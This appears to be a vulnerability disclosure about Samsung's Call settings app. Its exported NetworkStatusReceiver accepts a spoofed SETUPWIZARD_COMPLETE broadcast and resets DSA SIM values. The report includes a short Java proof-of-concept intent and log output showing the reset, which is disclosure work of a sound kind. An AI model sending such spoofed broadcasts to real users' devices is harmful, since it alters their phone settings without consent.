# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found in the Call settings app in the `com/samsung/android/app/telephonyui/netsettings/ui/simcardmanager/NetworkStatusReceiver.java` file handling of the `com.sec.android.app.setupwizard.SETUPWIZARD_COMPLETE` action, which resets DSA SIM states when processing a received broadcast.

**Proof of Concept**

```java
Intent i = new Intent("com.sec.android.app.setupwizard.SETUPWIZARD_COMPLETE");
i.setPackage("com.samsung.android.app.telephonyui");
sendBroadcast(i);
```

Result:
```
09-19 16:32:26.249 24710 24710 I NU.NetworkStatusReceiverUtils: resetSimValue simValue = 0, key = dsa_sim1_value
09-19 16:32:26.250 24710 24710 I NU.NetworkStatusReceiverUtils: resetSimValue simValue = 0, key = dsa_sim2_value
```
